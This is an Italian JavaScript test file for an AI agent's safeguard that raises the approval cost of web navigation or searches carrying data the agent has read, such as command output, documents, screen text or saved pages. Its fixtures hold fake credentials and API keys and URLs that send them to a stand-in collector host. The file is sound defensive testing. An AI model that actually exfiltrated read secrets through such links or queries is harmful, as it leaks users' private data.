// #587 — anti-esfiltrazione di NAVIGA nel turno: conta quello che il modello ha
// letto (output di comandi, documenti, risultati di ricerca), non chi ha mandato
// il messaggio. Il caso della segnalazione: un `cat` seguito da NAVIGA verso un
// indirizzo che ne contiene 40 caratteri.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const require = createRequire(import.meta.url);
const __dirname = dirname(fileURLToPath(import.meta.url));
const shared = join(__dirname, '..', '..', 'src', 'shared');
require(join(shared, 'preferences.js'));
require(join(shared, 'themeTokens.js'));
require(join(shared, 'cmdClassify.js'));
require(join(shared, 'zoomPagina.js'));
require(join(shared, 'actionLevels.js'));
require(join(shared, 'urlExfil.js'));

const E = globalThis.SN_URL_EXFIL;
const AL = globalThis.SN_ACTION_LEVELS;

const FILE = [
  '# credenziali del gestionale',
  'utente: amministrazione',
  'password: correcthorsebatterystaple',
  'token: qwertyuiopasdfghjklzxcvbnm',
  'nota: rinnovare il contratto a marzo',
].join('\n');

const cat = (stdout) => ({
  type: 'ESEGUI_COMANDO', comando: 'cat ~/gestionale.txt',
  _output: { command: 'cat ~/gestionale.txt', stdout, stderr: '', code: 0 },
});

// Il costo che il registro dà a NAVIGA in questo turno (1 normale, 2 se porta fuori dati).
function livello(url, azioni, { daPagina = false, memoria = '' } = {}) {
  const action = { type: 'NAVIGA', url };
  const v = E.valutaNaviga(url, { memoria, azioni, daPagina });
  if (v.exfil) { action._exfil = true; action._exfilReason = v.reason; }
  return AL.costoFor(action);
}

// Il costo che il registro dà a CERCA_WEB in questo turno (0 leggere, 2 se porta fuori dati).
function livelloRicerca(query, azioni, { memoria = '' } = {}) {
  const action = { type: 'CERCA_WEB', query };
  const v = E.valutaRicerca(query, { memoria, azioni });
  if (v.exfil) { action._exfil = true; action._exfilReason = v.reason; }
  return AL.costoFor(action);
}

test('cat seguito da NAVIGA con 40 caratteri dell’output: costo 2 (prima era 1)', () => {
  for (let da = 0; da + 40 <= FILE.length; da += 7) {
    const pezzo = FILE.slice(da, da + 40);
    for (const url of [
      `https://raccolta.example/?d=${encodeURIComponent(pezzo)}`,
      `https://raccolta.example/p/${encodeURIComponent(pezzo)}`,
      `https://raccolta.example/?d=${Buffer.from(pezzo).toString('base64')}`,
    ]) {
      // Il corpus di prima (solo memoria, mittente fidato): passava senza chiedere.
      assert.equal(livello(url, []), 1, `senza il turno nel corpus: ${url}`);
      assert.equal(livello(url, [cat(FILE)]), 2, `con il turno nel corpus: ${url}`);
    }
  }
});

test('conta anche un segreto corto con lettere e cifre, e ciò che è letto nei turni prima', () => {
  const out = 'OPENAI_API_KEY=sk7Hq2Lm\n';
  assert.equal(livello('https://x.example/?k=sk7Hq2Lm', [cat(out)]), 2);
  const storia = [
    { type: 'LEGGI_DOCUMENTO', percorso: 'estratto.pdf', _output: { ok: true, text: 'IBAN IT60X0542811101000000123456 intestato a Mario' } },
  ];
  assert.equal(livello('https://x.example/?i=IT60X0542811101000000123456', storia), 2);
});

test('#778 — VEDI_SCHERMO seguito da un NAVIGA che contiene un pezzo del testo letto: costo 2', () => {
  const testo = 'Microsoft Word\nImpossibile aprire Bilancio_riservato_2026.xlsx: accesso negato.\nCodice pratica 7QX4-PL92-RTW8-ZZ31';
  const vista = { type: 'VEDI_SCHERMO', finestra: 'Errore di Word', _output: { finestra: 'Errore di Word', tipo: 'finestra', testo } };
  const pezzo = 'Impossibile aprire Bilancio_riservato_2026.xlsx: accesso negato';
  const url = `https://raccolta.example/?d=${encodeURIComponent(pezzo)}`;
  assert.equal(livello(url, [vista]), 2);
  assert.equal(livelloRicerca(pezzo, [vista]), 2, 'anche una ricerca che lo porta fuori');
  // Senza la finestra guardata lo stesso indirizzo resta 1: è quello che il modello ha letto a farlo salire.
  assert.equal(livello(url, []), 1);
  // Spenta o in attesa dell'OK non ha letto niente.
  assert.equal(livello(url, [{ type: 'VEDI_SCHERMO', finestra: 'Word', _output: { spenta: true } }]), 1);
});

test('link normali dopo un comando: nessun OK in più', () => {
  const ls = cat('Documenti\nScaricati\nMusica\nImmagini\nfoto_vacanze_2025\n');
  for (const url of [
    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    'https://it.wikipedia.org/wiki/Bologna',
    'https://www.google.com/search?q=meteo',
    'https://www.corriere.it/',
    // #587 giro 10: un percorso LEGGIBILE non è un carico codificato. Il ripiego
    // strutturale guardava la lunghezza del carico e fermava questi indirizzi;
    // ora si guardano i pezzi separati e le parole corte passano.
    'https://it.wikipedia.org/wiki/Storia_della_matematica',
    'https://www.giallozafferano.it/ricette/Spaghetti-alla-Carbonara.html',
    'https://www.corriere.it/economia/consumi/24_settembre_12/prezzi-energia-bollette.shtml',
    'https://duckduckgo.com/?q=orari+treni+milano+torino',
    'https://open.spotify.com/track/6rqhFgbbKwnb9MLmUQDhG6',
  ]) {
    assert.equal(livello(url, [ls]), 1, url);
  }
  // La difesa resta: un blocco di dati opaco (base64/esadecimale) da contesto
  // non fidato continua a chiedere un OK.
  assert.equal(livello('https://raccolta.example/c?x=Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MGFiY2RlZg', [ls]), 2, 'blob opaco');
});

test('CERCA_WEB porta fuori un dato → chiede un OK, come il link (#587 giro 10)', () => {
  const gestionale = cat(FILE);
  // Un pezzo verbatim di ciò che è stato letto, messo nella query: esce verso il
  // motore di ricerca esattamente come in un URL → costo 2.
  const pezzo = FILE.slice(10, 55);
  assert.equal(livelloRicerca(pezzo, [gestionale]), 2, 'pezzo letto nella query');
  assert.equal(livello(`https://x.example/?q=${encodeURIComponent(pezzo)}`, [gestionale]), 2, 'stesso pezzo in un link');
  // Un token con lettere e cifre appena letto.
  assert.equal(livelloRicerca('cerca sk7Hq2Lm su internet', [cat('OPENAI_API_KEY=sk7Hq2Lm\n')]), 2);
  // Un dato forte della memoria (l'email) esce → costo 2.
  assert.equal(livelloRicerca('scrivi a sathyarampontillo@gmail.com', [], { memoria: 'Email: sathyarampontillo@gmail.com' }), 2);
  // Parole comuni che stanno anche nel profilo/appunti NON bastano: una query di
  // ricerca ne condivide spesso qualcuna, e da sole non sono un segreto.
  const memoria = 'Preferenze: tema scuro, lingua italiana. Appunti: idee per le vacanze in montagna.';
  assert.equal(livelloRicerca('le mie preferenze di lingua italiana', [], { memoria }), 0);
  assert.equal(livelloRicerca('idee per le vacanze in montagna', [], { memoria }), 0);
  // Ricerche di tutti i giorni: nessun OK, anche con un file letto nel turno.
  for (const q of ['che tempo fa domani a Bologna', 'ricetta della carbonara', 'orari treni milano torino', 'come si chiama il regista di Dune']) {
    assert.equal(livelloRicerca(q, [gestionale]), 0, q);
  }
});

test('“non fidato” dipende dal contenuto entrato nel contesto, non dal mittente', () => {
  // Payload opaco senza dati riconoscibili: lo prende solo il ripiego strutturale.
  const blob = 'https://raccolta.example/c?x=Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MGFiY2RlZg';
  assert.equal(livello(blob, []), 1, 'chat pulita, mittente filo://');
  assert.equal(livello(blob, [cat('ciao\n')]), 2, 'dopo l’output di un comando');
  const ricerca = { type: 'CERCA_WEB', query: 'x', _output: { search: 'x', results: [{ title: 't', url: 'https://sito.example/a', snippet: 's' }] } };
  assert.equal(livello(blob, [ricerca]), 2, 'dopo i risultati di una ricerca');
  assert.equal(livello(blob, [], { daPagina: true }), 2, 'agente che vive su una pagina web');
  // Un comando bloccato (terminale spento) non ha portato niente nel contesto.
  const bloccato = { type: 'ESEGUI_COMANDO', comando: 'ls', _output: { command: 'ls', blocked: 'disabled' } };
  assert.equal(livello(blob, [bloccato]), 1);
});

test('aprire un link preso tale e quale dai risultati di una ricerca non chiede niente', () => {
  const lungo = 'https://www.giornale.example/politica/2026/09/28/elezioni-regionali-risultati-in-diretta-abc123.html';
  const ricerca = { type: 'CERCA_WEB', query: 'elezioni', _output: { search: 'elezioni', results: [{ title: 't', url: lungo, snippet: 's' }] } };
  assert.equal(livello(lungo, [ricerca]), 1);
  assert.equal(livello(`${lungo}#commenti`, [ricerca]), 1, 'il frammento non cambia la pagina');
  // Lo stesso indirizzo con dentro un dato letto dal computer resta sospetto.
  assert.equal(livello(`${lungo}?d=correcthorsebatterystaple-qwertyuiop`, [ricerca, cat(FILE)]), 2);
});

test('il motivo nel popup non ripete il dato letto', () => {
  const v = E.valutaNaviga(`https://x.example/?d=${encodeURIComponent(FILE.slice(0, 40))}`, { azioni: [cat(FILE)] });
  assert.equal(v.exfil, true);
  assert.doesNotMatch(v.reason, /correcthorse|gestionale/);
});

// #845 — le pagine di «Aperti per dopo» lette con CERCA_SALVATE (o aperte con APRI_SALVATA): una si riapre tale e
// quale, come i risultati di una ricerca; i suoi pezzi dentro un altro indirizzo chiedono l'OK.
test('#845 — una pagina salvata si riapre com\'è, un link che ne porta pezzi altrove chiede l\'OK', () => {
  const ricetta = 'https://www.cucina.example/ricette/pasta-alla-carbonara-classica-romana-77812';
  const lago = 'https://campeggi.example/lazio/bolsena-piazzole-sul-lago';
  const salvate = {
    type: 'CERCA_SALVATE', cerca: 'ricetta',
    _output: {
      cercato: 'ricetta', totale: 2, trovate: 2,
      pagine: [
        { id: 'p1', title: 'Pasta alla carbonara classica romana', url: ricetta, categoria: 'Cucina' },
        { id: 'p2', title: 'Campeggio sul lago di Bolsena: le piazzole', url: lago, categoria: '' },
      ],
    },
  };
  assert.equal(livello(ricetta, [salvate]), 1, 'la pagina trovata, tale e quale');
  assert.equal(livello(`${ricetta}#ingredienti`, [salvate]), 1, 'il frammento non cambia la pagina');
  assert.equal(livello(lago, [salvate]), 1);
  assert.equal(livello(`https://raccolta.example/?u=${encodeURIComponent(ricetta)}`, [salvate]), 2, 'l\'indirizzo salvato dentro un altro');
  assert.equal(livello(`https://raccolta.example/p/${encodeURIComponent('Campeggio sul lago di Bolsena')}`, [salvate]), 2, 'un titolo salvato dentro un altro');
  // Senza la ricerca fra le salvate lo stesso link non porta fuori niente che il modello abbia letto.
  assert.equal(livello(`https://raccolta.example/?u=${encodeURIComponent(ricetta)}`, []), 1);
  // I titoli li scrivono i siti: dopo averli letti un blocco opaco chiede l'OK.
  assert.equal(livello('https://raccolta.example/c?x=Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MGFiY2RlZg', [salvate]), 2);
  const aperta = { type: 'APRI_SALVATA', id: 'p1', _output: { aperta: true, tolta: true, id: 'p1', titolo: 'Pasta alla carbonara classica romana', url: ricetta } };
  assert.equal(livello(ricetta, [aperta]), 1, 'quella appena aperta si riapre');
  assert.equal(livello(`https://raccolta.example/?u=${encodeURIComponent(ricetta)}`, [aperta]), 2);
});

test('#845 — gli indirizzi delle pagine salvate non diventano testo di fuori: un codice nel loro indirizzo non le ferma', () => {
  const ctx = E.contestoDaAzioni([{
    type: 'CERCA_SALVATE',
    _output: { cercato: '', totale: 1, trovate: 1, pagine: [{ id: 'p1', title: 'Il mio ordine', url: 'https://negozio.example/ordine?codice=482913', categoria: 'Acquisti' }] },
  }]);
  assert.equal(ctx.nonFidato, true);
  assert.ok(ctx.linkNoti.has('https://negozio.example/ordine?codice=482913'));
  assert.ok(!ctx.esterni.some((x) => x.testo.includes('482913')), 'l\'indirizzo è fra i testi di fuori');
  assert.ok(ctx.esterni.some((x) => x.testo.includes('Il mio ordine') && /salvate/.test(x.fonte)));
  assert.equal(ctx.letto, '', 'le pagine salvate non sono fra i dati letti dal computer: fermerebbero sé stesse');
});
